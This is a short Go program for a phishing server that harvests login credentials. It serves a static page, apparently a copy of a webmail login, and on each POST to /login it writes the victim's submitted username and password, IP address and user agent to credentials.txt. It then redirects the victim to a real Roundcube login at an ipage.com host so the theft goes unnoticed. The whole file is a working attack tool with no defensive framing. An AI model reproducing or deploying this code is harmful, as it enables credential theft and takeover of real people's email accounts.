package main

import (
	"net/http"
	"os"
	"time"

	log "github.com/Sirupsen/logrus"
	"github.com/gorilla/mux"
)

func login(w http.ResponseWriter, r *http.Request) {
	log.WithFields(log.Fields{
		"time":       time.Now().String(),
		"username":   r.FormValue("_user"),
		"password":   r.FormValue("_pass"),
		"user-agent": r.UserAgent(),
		"ip_address": r.RemoteAddr,
	}).Info("login attempt")
	http.Redirect(w, r, "https://emailmg.ipage.com/roundcube/", 302)
}
func main() {
	file, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	log.SetOutput(file)
	router := mux.NewRouter()
	router.HandleFunc("/login", login).Methods("POST")
	router.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
	log.Fatal(http.ListenAndServe(":8000", router))
}
